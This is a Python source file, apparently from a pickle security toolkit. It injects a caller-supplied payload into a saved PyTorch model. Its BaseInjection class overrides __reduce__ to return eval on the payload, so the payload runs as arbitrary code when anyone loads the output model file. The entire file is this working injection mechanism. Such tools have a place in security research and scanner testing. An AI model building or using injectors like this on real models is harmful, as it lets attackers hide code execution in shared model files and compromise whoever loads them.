import torch
import zipfile
from fickling.fickle import Pickled
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Optional

class BaseInjection(torch.nn.Module):
    def __init__(self, original_model: torch.nn.Module, payload: str):
        super().__init__()
        self.original_model = original_model
        self.payload = payload
    
    def forward(self, *args, **kwargs):
        return self.original_model(*args, **kwargs)
    
    def __reduce__(self):
        return eval, (self.payload,)


class PyTorchModelWrapper:
    def __init__(self, path: Path):
        self.path: Path = path
        self._pickled: Optional[Pickled] = None
    
    @property
    def pickled(self) -> Pickled:
        if self._pickled is None:
            with zipfile.ZipFile(self.path, 'r') as zip_ref:
                data_pkl_path = next((name for name in zip_ref.namelist() if name.endswith('/data.pkl')), None)
                if data_pkl_path is None:
                    raise ValueError("data.pkl not found in the zip archive")
                with zip_ref.open(data_pkl_path, "r") as pickle_file:
                    self._pickled = Pickled.load(pickle_file)
        return self._pickled
    
    def inject_payload(self, payload: str, output_path: Path, injection: str = "all") -> None:
        self.output_path = output_path
        # TODO Make use of insert_python_exec. This is difficult due to nuances with PyTorch pickle semantics
        # If more injection methods are added, add an injection argument to allow users to choose
        injected_model = BaseInjection(self.pickled, payload)
        torch.save(injected_model, output_path)